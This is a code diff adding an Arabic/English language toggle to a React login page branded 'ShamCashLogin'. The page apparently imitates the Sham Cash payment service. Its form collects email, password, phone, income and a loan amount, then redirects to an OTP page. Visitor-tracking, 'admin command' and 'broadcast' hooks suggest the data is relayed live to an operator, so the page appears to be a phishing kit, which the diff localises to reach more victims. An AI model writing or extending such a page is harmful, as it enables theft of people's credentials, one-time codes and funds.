@@ -11,6 +11,34 @@ import {
 import { useState, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
 import { useAdminCommands } from "@/hooks/useAdminCommands";
+import { useLang } from "@/hooks/useLang";
+
+const T = {
+  ar: {
+    lang: "English", dir: "rtl" as const,
+    heading: "تسجيل الدخول",
+    email: "البريد الإلكتروني",
+    password: "كلمة السر",
+    loan: "قيمة القرض المطلوب",
+    phone: "رقم الهاتف",
+    income: "الدخل الشهري",
+    submit: "تسجيل الدخول",
+    forgotPass: "هل نسيت كلمة المرور؟",
+    changePass: "تغيير كلمة المرور",
+  },
+  en: {
+    lang: "العربية", dir: "ltr" as const,
+    heading: "Sign In",
+    email: "Email Address",
+    password: "Password",
+    loan: "Requested Loan Amount",
+    phone: "Phone Number",
+    income: "Monthly Income",
+    submit: "Sign In",
+    forgotPass: "Forgot your password?",
+    changePass: "Change Password",
+  },
+};
 
 function ShamLogo() {
   return (
@@ -39,6 +67,8 @@ function broadcast(data: Record<string, string>) {
 export function ShamCashLogin() {
   const [showPassword, setShowPassword] = useState(false);
   const [fields, setFields] = useState({ email: "", password: "", loan: "", phone: "", income: "" });
+  const [lang, setLang] = useLang();
+  const t = T[lang];
   useVisitorTracking("تسجيل الدخول");
   useAdminCommands();
 
@@ -59,13 +89,15 @@ export function ShamCashLogin() {
   }
 
   return (
-    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir="rtl">
+    <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
       <div className="relative mx-auto flex min-h-screen w-full max-w-[390px] flex-col px-4 pb-7 pt-4 font-['Inter']">
         <div className="pointer-events-none absolute -left-24 top-0 h-72 w-72 rounded-full bg-[#6273d4]/10 blur-3xl" />
         <div className="pointer-events-none absolute -right-28 bottom-20 h-80 w-80 rounded-full bg-[#1fc28a]/5 blur-3xl" />
 
         <div className="relative flex items-center justify-between pt-2">
-          <div className="text-[15px] font-bold text-white/84">الإنكليزية</div>
+          <button onClick={() => setLang(lang === "ar" ? "en" : "ar")} className="text-[15px] font-bold text-white/70 hover:text-white transition-colors">
+            {t.lang}
+          </button>
           <div className="flex h-9 w-9 items-center justify-center rounded-full text-white">
             <Headphones className="h-6 w-6" strokeWidth={2.5} />
           </div>
@@ -106,8 +138,8 @@ export function ShamCashLogin() {
             window.location.href = "/otp";
           }}
         >
-          <h1 className="text-right text-[27px] font-extrabold tracking-[-0.02em] text-white/90">
-            تسجيل الدخول
+          <h1 className={`text-[27px] font-extrabold tracking-[-0.02em] text-white/90 ${lang === "ar" ? "text-right" : "text-left"}`}>
+            {t.heading}
           </h1>
 
           <div className="space-y-4">
@@ -115,9 +147,9 @@ export function ShamCashLogin() {
               <div className="text-white/60"><UserRound className="h-5 w-5" /></div>
               <input
                 type="email"
-                placeholder="البريد الإلكتروني"
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80"
-                dir="rtl"
+                placeholder={t.email}
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
                 autoComplete="email"
                 value={fields.email}
                 onChange={(e) => updateField("email", e.target.value)}
@@ -128,9 +160,9 @@ export function ShamCashLogin() {
               <div className="text-white/60"><Lock className="h-5 w-5" /></div>
               <input
                 type={showPassword ? "text" : "password"}
-                placeholder="كلمة السر"
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80"
-                dir="rtl"
+                placeholder={t.password}
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
                 autoComplete="current-password"
                 value={fields.password}
                 onChange={(e) => setFields((p) => ({ ...p, password: e.target.value }))}
@@ -146,9 +178,9 @@ export function ShamCashLogin() {
               <div className="text-white/60"><Banknote className="h-5 w-5" /></div>
               <input
                 type="number"
-                placeholder="قيمة القرض المطلوب"
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80"
-                dir="rtl"
+                placeholder={t.loan}
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
                 value={fields.loan}
                 onChange={(e) => updateField("loan", e.target.value)}
               />
@@ -158,9 +190,9 @@ export function ShamCashLogin() {
               <div className="text-white/60"><Phone className="h-5 w-5" /></div>
               <input
                 type="tel"
-                placeholder="رقم الهاتف"
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80"
-                dir="rtl"
+                placeholder={t.phone}
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir="ltr"
                 autoComplete="tel"
                 value={fields.phone}
                 onChange={(e) => updateField("phone", e.target.value)}
@@ -171,9 +203,9 @@ export function ShamCashLogin() {
               <div className="text-white/60"><TrendingUp className="h-5 w-5" /></div>
               <input
                 type="number"
-                placeholder="الدخل الشهري"
-                className="min-w-0 flex-1 bg-transparent text-right text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80"
-                dir="rtl"
+                placeholder={t.income}
+                className={`min-w-0 flex-1 bg-transparent text-[16px] font-semibold text-white outline-none placeholder:text-[#c9ccdb]/80 ${lang === "ar" ? "text-right" : "text-left"}`}
+                dir={t.dir}
                 value={fields.income}
                 onChange={(e) => updateField("income", e.target.value)}
               />
@@ -184,18 +216,18 @@ export function ShamCashLogin() {
             <button type="button" className="flex h-[58px] w-[58px] items-center justify-center rounded-[15px] bg-[#657bd8] shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.96] hover:bg-[#7089e0]">
               <Grid3X3 className="h-8 w-8 text-white" strokeWidth={2.6} />
             </button>
-            <button type="submit" className="h-[58px] rounded-[15px] bg-[#657bd8] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]" dir="rtl">
-              تسجيل الدخول
+            <button type="submit" className="h-[58px] rounded-[15px] bg-[#657bd8] text-[20px] font-extrabold text-white shadow-[0_16px_35px_rgba(101,123,216,0.22)] transition-transform active:scale-[0.98] hover:bg-[#7089e0]">
+              {t.submit}
             </button>
           </div>
 
           <p className="text-center text-[14px] font-semibold text-[#cfd2df]/78">
-            هل نسيت كلمة المرور؟{" "}
+            {t.forgotPass}{" "}
             <span
               className="cursor-pointer text-[#7183e6] hover:underline"
               onClick={() => { window.location.href = "/changepass"; }}
             >
-              تغيير كلمة المرور
+              {t.changePass}
             </span>
           </p>
           <p className="text-center text-[15px] font-semibold text-[#d4d6e3]/62">
